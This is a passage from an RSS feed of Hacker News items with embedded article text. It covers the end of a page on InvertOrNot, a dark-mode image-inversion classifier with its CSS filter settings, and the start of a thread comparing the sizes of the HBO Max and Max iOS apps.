        </p><ul>
            <li>no inversion: <code>filter: grayscale(50%);</code></li>
            <li>inversion: <code>filter: grayscale(50%) invert(100%) brightness(95%) hue-rotate(180deg);</code></li>
        </ul><p>
        Feel free to tweak these based on your dark mode setup.

        </p><h4>Goal</h4>
        <p>
            InvertOrNot is a public demonstration and proof of concept of using a NN classifier to choose how to
            handle images
            in dark-mode.
        </p>

        <h4>Support</h4>
        <p>
            InvertOrNot offers no warranties or guaranties and is done on a best-effort basis.
            If you need reliable or large-scale inversion APIs, I strongly recommend you download the FLOSS code and
            model and run your own instance. The model is lightweight (16MB) and can be run on a CPU (≈ 100ms using ONNX
            Runtime).
        </p>

        <h4>Side note</h4>
        <p>
            Images may be retained for training purposes. Should you prefer your images not be saved, hosting your own
            instance
            is recommended. Additionally, it's important to note that these images will not be distributed; they are
            solely used
            for training purposes
        </p>

        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why is the LinkedIn app almost half a gig? (150 pts)]]></title>
            <link>https://threadreaderapp.com/thread/1772350918534582525.html</link>
            <guid>39820649</guid>
            <pubDate>Mon, 25 Mar 2024 20:01:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://threadreaderapp.com/thread/1772350918534582525.html">https://threadreaderapp.com/thread/1772350918534582525.html</a>, See on <a href="https://news.ycombinator.com/item?id=39820649">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Last week we wrote how <a href="https://twitter.com/peacock">@peacock</a> reduced app size &amp; app launch after moving from RN to native</p><p>

By beautiful chance, another streaming app did the same this week. Did the same effects occur? Well, yes, no &amp; it depends</p><p>

🧵 Breaking down HBO's new Max app<br>
<span><span><blockquote data-conversation="none" data-align="center" data-dnt="true"><a href="https://twitter.com/Baconbrix/status/1661058851054010392">https://twitter.com/Baconbrix/status/1661058851054010392</a></blockquote></span></span></p></div><div><p>So, HBO Max is now Max. New app, new bundle id, new logo, &amp; entirely new codebase. Let's start by comparing the iOS size and architecture</p><p>

iOS<br>
HBO Max (old app): v53.20.1 - 60.4 MB install size<br>
Max (new app): v1.0.1 - 108.8 MB</p><p>

The new iOS app is 48.4 MB (~80%) bigger</p></div><div><p>Here's our X-Ray for the old HBO Max app. It consists of</p><p>

~18 MB of images (top left)<br>
~11 MB main.jsbundle (top right)<br>
~15 MB main binary (bottom left)</p><p>

The rest are misc frameworks, plugins, bundles, fonts, etc. <span><a href="https://pbs.twimg.com/media/Fw2EKZwaEAIjSTJ.jpg" target="_blank"><img alt="Treemap of the HBO Max iOS ..." src="https://threadreaderapp.com/images/1px.png" data-src="https://pbs.twimg.com/media/Fw2EKZwaEAIjSTJ.jpg"></a></span></p></div></div>]]></description>
        </item>
    </channel>
</rss>